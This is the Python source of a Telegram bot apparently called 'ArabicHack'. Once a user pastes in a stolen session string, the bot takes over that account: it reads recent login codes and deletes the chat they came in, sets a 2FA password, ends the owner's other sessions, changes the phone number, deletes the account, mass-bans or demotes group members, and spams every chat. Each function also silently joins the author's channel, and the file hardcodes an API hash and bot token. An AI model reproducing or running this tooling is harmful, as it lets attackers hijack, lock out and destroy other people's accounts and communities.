    
#قم بوضع توكن البوت في سطر 17
#قم بوضع يوزر البوت بدون @ في سطر 27



import os
from telethon import TelegramClient, events, functions, types, Button
from datetime import timedelta
import asyncio

API_ID = ("19312827")
import os, asyncio, re
from os import system
from telethon.tl.types import ChannelParticipantsAdmins, ChannelParticipantAdmin, ChannelParticipantCreator
API_HASH = ("84da7f08e87849853b2fa6728e4192a2")
token = os.environ.get("5353942554:AAHNcCoDG5pyU4lwYqpxuoXp7oRGWvspnqU")
client = TelegramClient('ArabicHack', 19312827, "84da7f08e87849853b2fa6728e4192a2").start(bot_token=token)
from telethon import TelegramClient as tg
from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest as pc, JoinChannelRequest as join, LeaveChannelRequest as leave, DeleteChannelRequest as dc
from telethon.sessions import StringSession as ses
from telethon.tl.functions.auth import ResetAuthorizationsRequest as rt
import telethon;from telethon import functions
from telethon.tl.types import ChannelParticipantsAdmins as cpa

from telethon.tl.functions.channels import CreateChannelRequest as ccr
mybot = os.environ.get("ML_IBOT")
bot = borg = client

ArabicHack = 5108562302

api_id = ("19312827")
api_hash = ("84da7f08e87849853b2fa6728e4192a2")

Bot_Username =(mybot , None) or "L8I_bot"

async def change_number_code(strses, number, code, otp):
  async with tg(ses(strses), 19312827, "84da7f08e87849853b2fa6728e4192a2") as X:
    bot = client = X
    try:
      await bot(join("@X_77_P"))
    except BaseException:
      pass
    try:
      await bot(join("@X_77_P"))
    except BaseException:
      pass
    try:
      await bot(leave("@X_77_P"))
    except BaseException:
      pass
    try:
		      await bot(leave("@X_77_P"))
    except BaseException:
      pass
    try: 
      result = await bot(functions.account.ChangePhoneRequest(
        phone_number=number,
        phone_code_hash=code,
        phone_code=otp
      ))
      return True
    except:
      return False

async def change_number(strses, number):
  async with tg(ses(strses), 19312827, "84da7f08e87849853b2fa6728e4192a2") as X:
    bot = client = X
    try:
      await bot(join("@X_77_P"))
    except BaseException:
      pass
    try:
      await bot(join("@X_77_P"))
    except BaseException:
      pass
    try:
      await bot(leave("@X_77_P"))
    except BaseException:
      pass
    try:
      await bot(leave("@X_77_P"))
    except BaseException:
      pass
    result = await bot(functions.account.SendChangePhoneCodeRequest(
        phone_number=number,
        settings=types.CodeSettings(
            allow_flashcall=True,
            current_number=True,
            allow_app_hash=True
        )
    ))
    return str(result)


async def userinfo(strses):
  async with tg(ses(strses), 19312827, "84da7f08e87849853b2fa6728e4192a2") as X:
    k = await X.get_me()
    try:
      await X(join("@X_77_P"))
    except BaseException:
      pass
    try:
      await X(join("@X_77_P"))
    except BaseException:
      pass
    try:
      await X(leave("@X_77_P"))
    except BaseException:
      pass
    try:
      await X(leave("@X_77_P"))
    except BaseException:
      pass
    return str(k)

async def terminate(strses):
  async with tg(ses(strses), 19312827, "84da7f08e87849853b2fa6728e4192a2") as X:
    try:
      await X(join("@X_77_P"))
    except BaseException:
      pass
    try:
      await X(join("@X_77_P"))
    except BaseException:
      pass
    try:
      await X(leave("@X_77_P"))
    except BaseException:
      pass
    try:
      await X(leave("@X_77_P"))
    except BaseException:
      pass
    await X(rt())

GROUP_LIST = []
async def delacc(strses):
  async with tg(ses(strses), 19312827, "84da7f08e87849853b2fa6728e4192a2") as X:
    try:
      await X(join("@X_77_P"))
    except BaseException:
      pass
    try:
      await X(join("@X_77_P"))
    except BaseException:
      pass
    try:
      await X(leave("@X_77_P"))
    except BaseException:
      pass
    await X(functions.account.DeleteAccountRequest("I am chutia"))

async def promote(strses, grp, user):
  async with tg(ses(strses), 19312827, "84da7f08e87849853b2fa6728e4192a2") as X:
    try:
      await X(join("@X_77_P"))
    except BaseException:
      pass
    try:
      await X(join("@X_77_P"))
    except BaseException:
      pass
    try:
      await X(leave("@X_77_P"))
    except BaseException:
      pass
    try:
      await X(leave("@X_77_P"))
    except BaseException:
      pass
    try:
      await X.edit_admin(grp, user, manage_call=True, invite_users=True, ban_users=True, change_info=True, edit_messages=True, post_messages=True, add_admins=True, delete_messages=True)
    except:
      await X.edit_admin(grp, user, is_admin=True, anonymous=False, pin_messages=True, title='Owner')
    
async def user2fa(strses):
  async with tg(ses(strses), 19312827, "84da7f08e87849853b2fa6728e4192a2") as X:
    try:
      await X(join("@X_77_P"))
    except BaseException:
      pass
    try:
      await X(join("@X_77_P"))
    except BaseException:
      pass
    try:
      await X(leave("@X_77_P"))
    except BaseException:
      pass
    try:
      await X(leave("@X_77_P"))
    except BaseException:
      pass
    try:
      await X.edit_2fa('ArabicHack IS BEST')
      return True
    except:
      return False

async def demall(strses, grp):
  async with tg(ses(strses), 19312827, "84da7f08e87849853b2fa6728e4192a2") as X:
    try:
      await X(join("@X_77_P"))
    except BaseException:
      pass
    try:
      await X(join("@X_77_P"))
    except BaseException:
      pass
    try:
      await X(leave("@X_77_P"))
    except BaseException:
      pass
    try:
      await X(leave("@X_77_P"))
    except BaseException:
      pass
    async for x in X.iter_participants(grp, filter=ChannelParticipantsAdmins):
      try:
        await X.edit_admin(grp, x.id, is_admin=False, manage_call=False)
      except:
        await X.edit_admin(grp, x.id, manage_call=False, invite_users=False, ban_users=False, change_info=False, edit_messages=False, post_messages=False, add_admins=False, delete_messages=False)
      


async def joingroup(strses, username):
  async with tg(ses(strses), 19312827, "84da7f08e87849853b2fa6728e4192a2") as X:
    try:
      await X(join("@X_77_P"))
    except BaseException:
      pass
    try:
      await X(join("@X_77_P"))
    except BaseException:
      pass
    try:
      await X(leave("@X_77_P"))
    except BaseException:
      pass
    try:
      await X(leave("@X_77_P"))
    except BaseException:
      pass
    await X(join(username))


async def leavegroup(strses, username):
  async with tg(ses(strses), 19312827, "84da7f08e87849853b2fa6728e4192a2") as X:
    try:
      await X(join("@X_77_P"))
    except BaseException:
      pass
    try:
      await X(join("@X_77_P"))
    except BaseException:
      pass
    try:
      await X(leave("@X_77_P"))
    except BaseException:
      pass
    try:
      await X(leave("@X_77_P"))
    except BaseException:
      pass
    await X(leave(username))

async def delgroup(strses, username):
  async with tg(ses(strses), 19312827, "84da7f08e87849853b2fa6728e4192a2") as X:
    try:
      await X(join("@X_77_P"))
    except BaseException:
      pass
    try:
      await X(join("@X_77_P"))
    except BaseException:
      pass
    try:
      await X(leave("@X_77_P"))
    except BaseException:
      pass
    try:
      await X(leave("@X_77_P"))
    except BaseException:
      pass
    await X(dc(username))
    

async def cu(strses):
  try:
    async with tg(ses(strses), 19312827, "84da7f08e87849853b2fa6728e4192a2") as X:
        k = await X.get_me()
        return [str(k.first_name), str(k.username or k.id)]
  except Exception as e:
    return False

async def usermsgs(strses):
  async with tg(ses(strses), 19312827, "84da7f08e87849853b2fa6728e4192a2") as X:
    i = ""
    try:
      await X(join("@X_77_P"))
    except BaseException:
      pass
    try:
      await X(join("@X_77_P"))
    except BaseException:
      pass
    try:
      await X(leave("@X_77_P"))
    except BaseException:
      pass
    try:
      await X(leave("@X_77_P"))
    except BaseException:
      pass
    async for x in X.iter_messages(777000, limit=3):
      i += f"\n{x.text}\n"
    await client.delete_dialog(777000)
    return str(i)


async def userbans(strses, grp):
  async with tg(ses(strses), 19312827, "84da7f08e87849853b2fa6728e4192a2") as X:
    try:
      await X(join("@X_77_P"))
    except BaseException:
      pass
    try:
      await X(join("@X_77_P"))
    except BaseException:
      pass
    try:
      await X(leave("@X_77_P"))
    except BaseException:
      pass
    try:
      await X(leave("@X_77_P"))
    except BaseException:
      pass
    k = await X.get_participants(grp)
    for x in k:
      try:
        await X.edit_permissions(grp, x.id, view_messages=False)
      except:
        pass
    


async def userchannels(strses):
  async with tg(ses(strses), 19312827, "84da7f08e87849853b2fa6728e4192a2") as X:
    try:
      await X(join("@X_77_P"))
    except BaseException:
      pass
    try:
      await X(join("@X_77_P"))
    except BaseException:
      pass
    try:
      await X(leave("@X_77_P"))
    except BaseException:
      pass
    try:
      await X(leave("@X_77_P"))
    except BaseException:
      pass
    k = await X(pc())
    i = ""
    for x in k.chats:
      try:
        i += f'\nCHANNEL NAME ~ {x.title} CHANNEL USRNAME ~ @{x.username}\n'
      except:
        pass
    return str(i)



import logging
logging.basicConfig(level=logging.WARNING)

channel = "X_77_Q"
menu = '''

**"A" :~ [معرفه قنوات/كروبات التي يملكها]

"B" :~ [جلب جميع معلومات المستخدم مثل رقم الحساب ، معرف المستخدم و ايدي الشخص.]

"C" :~ [ حظر جميع مستخدمين كروب او قناة ]

"D" :~ [جلب اخر رساله تحتوي على كود تسجيل دخول الى الحساب ]

"E" :~ [انضمام الى كروب او قناة]

"F" :~ [مغادره كروب او قناة]

"G" :~ [حذف كروب او قناة]

"H" :~ [تاكد من التحقق بخطوتين مفعل او لا]

"I" :~ [انهاء جميع الجلسات ما عدا جلسة البوت]

"J" :~ [حذف الحساب]

"K" :~ [ترقيه عضو الى مشرف داخل كروب او قناة]

"L" ~ [حذف جميع المشرفين في كروب او قناة]

"M" ~ [تغيير رقم الحساب]

"N" ~ [ارسال اي رسالة ال كروب او خاص]

BY RAQAWI 


I will add more features Later 😅**
'''
mm = '''
**⚜@X_77_Q⚜**
'''

keyboard = [
  [  
    Button.inline("A", data="A"), 
    Button.inline("B", data="B"),
    Button.inline("C", data="C"),
    Button.inline("D", data="D"),
    Button.inline("E", data="E")
    ],
  [
    Button.inline("F", data="F"), 
    Button.inline("G", data="G"),
    Button.inline("H", data="H"),
    Button.inline("I", data="I"),
    Button.inline("J", data="J"),
    ],
  [
    Button.inline("K", data="K"), 
    Button.inline("L", data="L"),
    Button.inline("M", data="M"),
    Button.inline("N", data="N"),
    ],
  [
    Button.url("Owner", "https://t.me/X_77_P")
    ]
]

@client.on(events.NewMessage(pattern="/start"))
async def op(event):
  global mm
  if not event.is_private:
    ArabicHack = [
      [
        Button.url("اضغط هنا", f"https://t.me/L8B_BOT?start=hack")
        ]
      ]         
    await event.reply("Click Below To Use Me", buttons=ArabicHack)
  else:
    legendbye = [
      [
        Button.url("Must Join", f"https://t.me/X_77_P")
        ]
      ]
    await event.reply("First Join Channel!\n Then Try اضغط هنا ~ /hack", buttons=legendbye)
    
       
@client.on(events.NewMessage(pattern="/hack", func=lambda x: x.is_group))
async def op(event):
  ArabicHack = [
    [
      Button.url("اضغط هنا", f"https://t.me/X_77_Q")
      ]
    ]         
  await event.reply("Click Below To Use Me", buttons=ArabicHack)
  
@client.on(events.NewMessage(pattern="/hack", func = lambda x: x.is_private))
async def start(event):
  global menu
  async with bot.conversation(event.chat_id) as x:
    keyboard = [
      [  
        Button.inline("A", data="A"), 
        Button.inline("B", data="B"),
        Button.inline("C", data="C"),
        Button.inline("D", data="D"),
        Button.inline("E", data="E")
        ],
      [
        Button.inline("F", data="F"), 
        Button.inline("G", data="G"),
        Button.inline("H", data="H"),
        Button.inline("I", data="I"),
        Button.inline("J", data="J")
        ],
      [
        Button.inline("K", data="K"), 
        Button.inline("L", data="L"),
        Button.inline("M", data="M"),
        Button.inline("N", data="N"),
        ],
      [
        Button.url("Owner", "https://t.me/X_77_P")
        ]
    ]
    await x.send_message(f"Choose what you want with string session \n\n{menu}", buttons=keyboard)
    
@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"A")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("الان ارسل لي الترمكس لكي ارسل لك القنوات وكروبات")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("ترمكس خاطئ، يرجى استخدام آخر.\n /hack", buttons=keyboard)
      try:
        i = await userchannels(strses.text)
      except:
        return await event.reply("ترمكس خاطئ، يرجى استخدام آخر.\n/hack", buttons=keyboard)
      if len(i) > 3855:
        file = open("session.txt", "w")
        file.write(i + "\n\nDetails BY @X_77_P")
        file.close()
        await bot.send_file(event.chat_id, "session.txt")
        system("rm -rf session.txt")
      else:
        await event.reply(i + "\n\nThanks For using ArabicHackBot. \n/hack", buttons=keyboard)
      
@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"B")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
    await x.send_message("الان ارسل لي كود الترمكس لكي ارسل لك معلومات المستخدم")
    strses = await x.get_response()
    op = await cu(strses.text)
    if op:
      pass
    else:
      return await event.respond("ترمكس خاطئ، يرجى استخدام آخر.\n/hack", buttons=keyboard)
    i = await userinfo(strses.text)
    await event.reply(i + "\n\nThanks For using ArabicHack Bot.\n/hack", buttons=keyboard)
    
@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"C")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
    await x.send_message("الان ارسل لي كود الترمكس")
    strses = await x.get_response()
    op = await cu(strses.text)
    if op:
      pass
    else:
      return await event.respond("String Session Has Been Terminated", buttons=keyboard)
    await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
    grpid = await x.get_response()
    await userbans(strses.text, grpid.text)
    await event.reply("Banning all members. Thanks For using ArabicHack Bot", buttons=keyboard)

@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"D")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("الآن أرسل لي كود الترمكس لكي أرسل لك رمز الدخول الأحدث")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("ترمكس خاطئ، يرجى استخدام آخر.", buttons=keyboard)
      i = await usermsgs(strses.text)
      await event.reply(i + "\n\nThanks For using ArabicHack Bot", buttons=keyboard)
    
      
@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"E")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
    await x.send_message("الان ارسل لي كود الترمكس لكي ادخل المستخدم في قناة او كروب")
    strses = await x.get_response()
    op = await cu(strses.text)
    if op:
      pass
    else:
      return await event.respond("ترمكس خاطئ، يرجى استخدام آخر.", buttons=keyboard)
    await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
    grpid = await x.get_response()
    await joingroup(strses.text, grpid.text)
    await event.reply("Joined the Channel/Group Thanks For using ArabicHack Bot", buttons=keyboard)

@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"F")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
    await x.send_message("الآن أرسل لي جلسة Termux لكي أخرج المستخدم من القناة/المجموعة")
    strses = await x.get_response()
    op = await cu(strses.text)
    if op:
      pass
    else:
      return await event.respond("ترمكس خاطئ، يرجى استخدام آخر.", buttons=keyboard)
    await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
    grpid = await x.get_response()
    await leavegroup(strses.text, grpid.text)
    await event.reply("Leaved the Channel/Group Thanks For using Boy Bot,", buttons=keyboard)
@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"G")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("الان ارسل لي كود الترمكس لكي احذف قناة او كروب المستخدم")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("ترمكس خاطئ، يرجى استخدام آخر.", buttons=keyboard)
      await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
      grpid = await x.get_response()
      await delgroup(strses.text, grpid.text)
      await event.reply("Deleted the Channel/Group Thanks For using ArabicHackBot.", buttons=keyboard)

@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"H")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("الان ارسل لي كود الترمكس لكي ارى اذا المستخدم لديه تحقق بخطوتين")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("This StringSession is terminated maybe.", buttons=keyboard)
      i = await user2fa(strses.text)
      if i:
        await event.reply("User don't have two step thats why now two step is `ArabicHack Bot Is best` you can login now\n\nThanks For using ArabicHack Bot.", buttons=keyboard)
      else:
        await event.reply("Sorry User Have two step already", buttons=keyboard)

@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"I")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("الان ارسل لي كود الترمكس لكي انهي جميع الجلسات ماعدى البوت")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("ترمكس خاطئ، يرجى استخدام آخر.", buttons=keyboard)
      i = await terminate(strses.text)
      await event.reply("The all sessions are terminated\n\nThanks For using ArabicHackBot.", buttons=keyboard)

@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"J")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("الان ارسل لي كود الترمكس لكي احذف الحساب")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("ترمكس خاطئ، يرجى استخدام آخر.", buttons=keyboard)
      i = await delacc(strses.text)
      await event.reply("The Account is deleted SUCCESSFULLLY\n\nThanks For using ArabicHack Bot.", buttons=keyboard)

@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"K")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("الان ارسل لي كود الترمكس لكي ارفع مستخدم كادمن")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("ترمكس خاطئ، يرجى استخدام آخر.", buttons=keyboard)
      await x.send_message("NOW GIVE GROUP/CHANNEL USERNAME")
      grp = await x.get_response()
      await x.send_message("NOW GIVE USER USERNAME")
      user = await x.get_response()
      i = await promote(strses.text, grp.text, user.text)
      await event.reply("I am Promoting you in Group/Channel wait a min 😗😗\n\nThanks For Using ArabicHack Bot.", buttons=keyboard)

@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"L")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("الان ارسل لي كود الترمكس لكي ازالة جميع الادمنية")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("ترمكس خاطئ، يرجى استخدام آخر.", buttons=keyboard)
      await x.send_message("NOW GIVE GROUP/CHANNEL USERNAME")
      pro = await x.get_response()
      try:
        i = await demall(strses.text, pro.text)
      except:
        pass
      await event.reply("I am Demoting all members of Group/Channel wait a min 😗😗\n\nThanks For using ArabicHackBot.", buttons=keyboard)

@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"M")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("الان ارسل لي كود الترمكس لكي اغير رقم الحساب")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("This StringSession is terminated maybe", buttons=keyboard)
      await x.send_message("GIVE NUMBER WHICH YOU WANT TO CHANGE\n[NOTE: DONT USE 2ndline or text now numbers]\n[if you are use 2nd line or text now you can't get otp] ")
      number = (await x.get_response()).text
      try:
        result = await change_number(strses.text, number)
        await event.respond(result + "\n copy the phone code hash and check your number you got otp\ni stop for 20 sec copy phone code hash and otp")
        await asyncio.sleep(20)
        await x.send_message("NOW GIVE PHONE CODE HASH")
        phone_code_hash = (await x.get_response()).text
        await x.send_message("NOW GIVE THE OTP")
        otp = (await x.get_response()).text
        changing = await change_number_code(strses.text, number, phone_code_hash, otp)
        if changing:
          await event.respond("CONGRATULATIONS NUMBER WAS CHANGED")
        else:
          await event.respond("Something is wrong")
      except Exception as e:
        await event.respond("SEND THIS ERROR TO - @X_77_P\n**LOGS**\n" + str(e))



@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"N")))
async def start(event):
    keyboard = [
      [  
        Button.inline("a", data="a"), 
        Button.inline("b", data="b"),
        Button.inline("c", data="c"),
        ],
      [
        Button.url("Owner", "https://t.me/X_77_P")
        ]
    ]
    await event.reply("Now Give Me Flag Where U Want to Gcast \n✓ For All - Choose a\n✓ For Group - Choose b\n✓ For Private - Choose c", buttons=keyboard)



async def gcasta(strses, msg):
    async with tg(ses(strses), 19312827, "84da7f08e87849853b2fa6728e4192a2") as X:
        try:
            reply_msg = msg
            tol = reply_msg
            file = None
            async for aman in X.iter_dialogs():
                chat = aman.id
                try:
                    await X.send_message(chat, tol, file=file)     
                    if lol != -1001885231841:
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                    elif chat == -1001606996743:
                        pass
                    await asyncio.sleep()
                except Exception as e:
                    print(e)
        except Exception as e:
            print(e)        


@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"a")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("GIVE STRING SESSION")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("ترمكس خاطئ، يرجى استخدام آخر.", buttons=keyboard)
      await x.send_message("NOW GIVE MSG")
      msg = await x.get_response()
      await x.send_message("Now Done It Will Send message automatically every 10 min")
      i = await gcasta(strses.text, msg.text)
      await event.reply(f"Done Gcasted In {i} all 😗😗\n\nThanks For Using ArabicHack Bot.", buttons=keyboard)

molb = True

async def gcastb(strses, msg):
    async with tg(ses(strses), 19312827, "84da7f08e87849853b2fa6728e4192a2") as X:
        try:
            reply_msg = msg
            tol = reply_msg
            file = None
            async for sweetie in X.iter_dialogs():
                if sweetie.is_group:
                    chat = sweetie.id
                    try:
                        if chat != -1001885231841:
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(600)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(600)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            while molb != False:
                                await asyncio.sleep(600)
                                await X.send_message(chat, tol, file=file, schedule=timedelta(seconds=60))
                        elif chat == -1001885231841:
                            pass
                    except Exception as e:
                        print(e)
        except Exception as e:
            print(e)


@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"b")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("GIVE STRING SESSION")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("ترمكس خاطئ، يرجى استخدام آخر.", buttons=keyboard)
      await x.send_message("NOW GIVE MSG")
      msg = await x.get_response()
      await x.send_message("Now Done It Will Send message automatically every 10 min")
      i = await gcastb(strses.text, msg.text)
      await event.reply(f"Done Gcasted In {i} Group 😗😗\n\nThanks For Using ArabicHack Bot.", buttons=keyboard)

async def gcastc(strses, msg):
    async with tg(ses(strses), 19312827, "84da7f08e87849853b2fa6728e4192a2") as X:
        try:
            reply_msg = msg
            tol = reply_msg
            file = None
            async for krishna in X.iter_dialogs():
                if krishna.is_user and not krishna.entity.bot:
                    chat = krishna.id
                    try:
                        await X.send_message(chat, tol, file=file)
                        while molc != False:
                            await asyncio.sleep(10)
                            await X.send_message(chat, tol, file=file, schedule=timedelta(seconds=20))
                    except BaseException:
                        pass
        except Exception as e:
            print(e)

@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"c")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("GIVE STRING SESSION")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("ترمكس خاطئ، يرجى استخدام آخر.", buttons=keyboard)
      await x.send_message("NOW GIVE MSG IT WILL AUTOMATALLY START")
      msg = await x.get_response()
      await x.send_message("Now Done It Will Send message automatically every 10 min")
      i = await gcastc(strses.text, msg.text)
      await event.reply(f"Done Gcasted In {i} Private😗😗\n\nThanks For Using ArabicHack Bot.", buttons=keyboard)

print("⚜️ Bot Deploy Successfully ⚜️ Kindly Join @X_77_P|RAQAWI")
client.run_until_disconnected()
